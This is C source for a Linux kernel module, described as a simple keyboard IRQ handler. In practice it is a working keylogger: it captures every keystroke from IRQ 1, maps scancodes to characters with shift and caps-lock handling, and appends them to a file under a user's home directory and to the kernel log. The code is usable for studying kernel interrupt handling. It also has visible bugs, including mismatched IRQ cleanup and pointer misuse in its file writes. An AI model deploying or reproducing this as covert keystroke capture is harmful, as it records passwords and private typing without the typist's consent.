#include <linux/init.h>           /* Macros used to mark up functions e.g. __init __exit */
#include <linux/module.h>         /* Core header for loading LKMs into the kernel */
#include <linux/kernel.h>         /* Contains types, macros, functions for the kernel */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/slab.h>           /* kmalloc */
#include <linux/interrupt.h>	  /* We want an interrupt */
#include <asm/io.h>
#include <asm/irq_vectors.h>

#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

/* Keyboard IRQ on intel arch */
#define LKM_KDB_IRQ_NUM 1
/* Workqueue name */
#define LKM_KDB_IRQ_WQ_NAME "lkm_kdb_irq"

#define LKM_KDB_STATUS   0x64
#define LKM_KDB_SCANCODE 0x60

static const char *key_names[] = {
   "-", "<ESC>",
   "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
   "  ", "    ",
   "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
   "[", "]", "\n", "<LCtrl>",
   "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
   "'", "`", "<LShift>",
   "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
   " ",
   "  ",
   "<LAlt>", " ", " ",
   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<NumLock>", "<ScrollLock>",
   "<KP7>", "<KP8>", "<KP9>",
   "<KP->",
   "<KP4>", "<KP5>", "<KP6>",
   "<KP+>",
   "<KP1>", "<KP2>", "<KP3>", "<KP0>",
   "<KP.>",
   "-", "-", "-",
   "<F11>", "<F12>",
   "-", "-", "-", "-", "-", "-", "-",
   "  ", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "-",
   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
   "<PageDown>", "<Insert>", "<Delete>"
};

static int size_of_str[] = {1, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 7, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 6, 1, 1, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 9, 12, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 1, 1, 1, 5, 5, 1, 1, 1, 1, 1, 1, 1, 2, 7, 5, 7, 6, 1, 6, 4, 8, 6, 7, 5, 6, 10, 8, 8
};


static const char *key_names_caps[] = {
   "-", "<ESC>",
   "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
   " ", "    ",
   "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
   "[", "]", "\n", "<LCtrl>",
   "A", "S", "D", "F", "G", "H", "J", "K", "L", ";",
   "'", "`", " ",
   "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/",
   " ",
   " ",
   " ", " ", " ",
   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<NumLock>", "<ScrollLock>",
   " ", " ", " ",
   " ",
   " ", " ", " ",
   " ",
   " ", " ", " ", " ",
   " ",
   "-", "-", "-",
   " ", " ",
   "-", "-", "-", "-", "-", "-", "-",
   "", " ", " ", "<SysRq>", " ", "-",
   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
   "<PageDown>", "<Insert>", "<Delete>"
};

static int size_of_string_caps[] =  {1, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 7, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 9, 12, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 7, 1, 1, 6, 4, 8, 6, 7, 5, 6, 10, 8, 8};



static const char *key_names_shift[] = {
   "-", "<ESC>",
   "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "=",
   "    ", "    ",
   "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
   "[", "]", "\n", "",
   "A", "S", "D", "F", "G", "H", "J", "K", "L", ";",
   "'", "`", " ",
   "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/",
   " ",
   " ",
   " ", " ", " ",
   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   " ", " ",
   " ", " ", " ",
   " ",
   " ", " ", " ",
   " ",
   " ", " ", " ", " ",
   " ",
   "-", "-", "-",
   " ", " ",
   "-", "-", "-", "-", "-", "-", "-",
   " ", " ", "<KP/>", "<SysRq>", " ", "-",
   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
   "<PageDown>", "<Insert>", "<Delete>"
};


static int size_of_string_shift[] = {1, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 5, 7, 1, 1, 6, 4, 8, 6, 7, 5, 6, 10, 8, 8};




static struct file *fp = NULL;
/** Make the structure to be passed to the workqueue handler**/
typedef struct {
    struct work_struct w;
    unsigned char scancode;
} lkm_kdb_irq_task_t;

/** Declare the workqueue struct **/
static struct workqueue_struct *lkm_kdb_irq_wq = NULL;

/** kdb_irq_t instance **/
lkm_kdb_irq_task_t *work;


struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file *file) 
{
    filp_close(file, NULL);
}

int file_write(struct file *file, unsigned long long offset, const char *data[], unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, *data, size, &offset);

    set_fs(oldfs);
    return ret;
}

/*
static void write_byte_by_byte(char *pos[]) {

   unsigned int count = 0;
	 while (*pos != '\0') {
	    count += 1;
      pos++;
       //printf("%c\n", *(pos++));
      }
   file_write(fp,0,  (const char *)&pos, count);
}
*/

/**
 * This will get called by the kernel as soon as it's safe to do everything normally allowed by kernel modules.
 */
static void lkm_kdb_irq_got_char(struct work_struct *w) {
  /* Get the main pointer */
  lkm_kdb_irq_task_t *work = container_of(w, lkm_kdb_irq_task_t, w);
  /* Get scancode and the release state */
  int scancode = work->scancode & 0x7F;
  char released = work->scancode & 0x80 ? 1 : 0;

  //char *pchar = &released;
  static int caps_lock  = 0;
  //char *arr;
  static int shift_val = 0;
  

  if (scancode < 112) {

	if(!released && scancode == 0x2a) {
		shift_val = 1;
	}else if (released && scancode == 0x2a) {
		shift_val = 0;
	}


	if (shift_val == 1){
    if (released) { 
		printk(KERN_INFO "Scan Code %x %s.\n",
		scancode, released ? "Released" : "Pressed");
		printk(KERN_INFO "Key Code %s. counter = %i\n",
		key_names_caps[scancode], caps_lock);
		//write_byte_by_byte(&key_names_caps[scancode]);
		//file_write(fp,0,  &key_names_caps[scancode], 2);
		file_write(fp,0,  &key_names_shift[scancode], size_of_string_shift[scancode]);
		}

	}else {
	  if (released) {
		if(scancode == 0x3a){
			if (caps_lock == 0) {
				caps_lock = 1;
			}else if (caps_lock == 1){
				caps_lock = 0;
			}
		}
		 if (caps_lock == 1) {
			// new array value caps lock on
		        //arr = key_names_caps;
			printk(KERN_INFO "Scan Code %x %s.\n",
			 scancode, released ? "Released" : "Pressed");
		  	printk(KERN_INFO "Key Code %s. counter = %i\n",
			 key_names_caps[scancode], caps_lock);
			//write_byte_by_byte(&key_names_caps[scancode]);
			//file_write(fp,0,  &key_names_caps[scancode], 2);
			file_write(fp,0,  &key_names_caps[scancode], size_of_string_caps[scancode]);
		  } else if (caps_lock == 0){
			// old array values
			printk(KERN_INFO "Scan Code %x %s.\n",
			 scancode, released ? "Released" : "Pressed");
		  	printk(KERN_INFO "Key Code %s. counter = %i\n",
			 key_names[scancode], caps_lock);
			//write_byte_by_byte(&key_names[scancode]);
			file_write(fp,0,  &key_names[scancode], size_of_str[scancode]);
		  }

	  }
/*	
	  printk(KERN_INFO "Scan Code %x %s.\n",
		 scancode, released ? "Released" : "Pressed");
	  printk(KERN_INFO "Key Code %s. counter = %i\n",
		 arr[scancode], caps_lock);*/
   	  }
  }
}

/**
 * Reads the relevant information from the keyboard IRQ handler and then puts the non RT part into the work queue.
 * This will be run when the kernel considers it safe.
 */
irqreturn_t lkm_kdb_irq_handler(int irq, void *dev_id) {
  static unsigned char scancode;
  unsigned char status;

  /* Read keyboard status */
  status = inb(LKM_KDB_STATUS);
  scancode = inb(LKM_KDB_SCANCODE);
  /* Write the new value */
  work->scancode = scancode;
  /* Queue new work */
  queue_work(lkm_kdb_irq_wq, &work->w);
  return IRQ_HANDLED;
}

/**
 * Initialize the module - register the IRQ handler 
 * @brief The LKM initialization function - register the IRQ handler.
 * @return returns 0 if successful
 */




static int __init lkm_kdb_irq_init(void) {
  /* Create/init/alloc the necessaries objects to the workqueue functions */


  //open file
  
  char *filename = "/home/anmol/linux_239/newfile";
  fp = file_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
 

  lkm_kdb_irq_wq = create_workqueue(LKM_KDB_IRQ_WQ_NAME);
  work = (lkm_kdb_irq_task_t *)kmalloc(sizeof(lkm_kdb_irq_task_t), GFP_KERNEL);
  if (work) {
    INIT_WORK(&work->w, lkm_kdb_irq_got_char);
  }
  /*
   * Request IRQ 1 (keyboard IRQ), and register the callback function to the associated IRQ handler.
   * SA_SHIRQ: Means we're willing to have other handlers on this IRQ.
   * SA_INTERRUPT: Can be used to make the handler into a fast interrupt.
   */
  return request_irq(LKM_KDB_IRQ_NUM, /* The number of the keyboard IRQ on PCs */
		     lkm_kdb_irq_handler, /* module handler */
		     IRQF_SHARED, /* Means we're willing to have other handlers on this IRQ. */
		     "lkm_kdb_irq_handler", /* Shortname displayed into  /proc/interrupts. */
		     (void*)work); /* This parameter can point to anything but it shouldn't be NULL, 
						finally it's important to pass the same pointer value to the free_irq function. */
}


/**
 * @brief The LKM cleanup function.
 */
static void __exit lkm_kdb_irq_exit(void) {  
  /* cleanup workqueue resources */
  flush_workqueue(lkm_kdb_irq_wq);
  destroy_workqueue(lkm_kdb_irq_wq);
  kfree((void *)work);
  /* 
   * In this case, the instruction below it's totally useless, 
   * because we can't restore the previous keyboard handler, and that the computer should be rebooted.
   */
  free_irq(LKM_KDB_IRQ_NUM, NULL);
}
module_init(lkm_kdb_irq_init);
module_exit(lkm_kdb_irq_exit);

/* module infos */
/* some work_queue related functions are just available to GPL licensed Modules */
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");
MODULE_AUTHOR("Keidan (Kevin Billonneau)");
MODULE_DESCRIPTION("Simple LKM keyboard IRQ handler.");
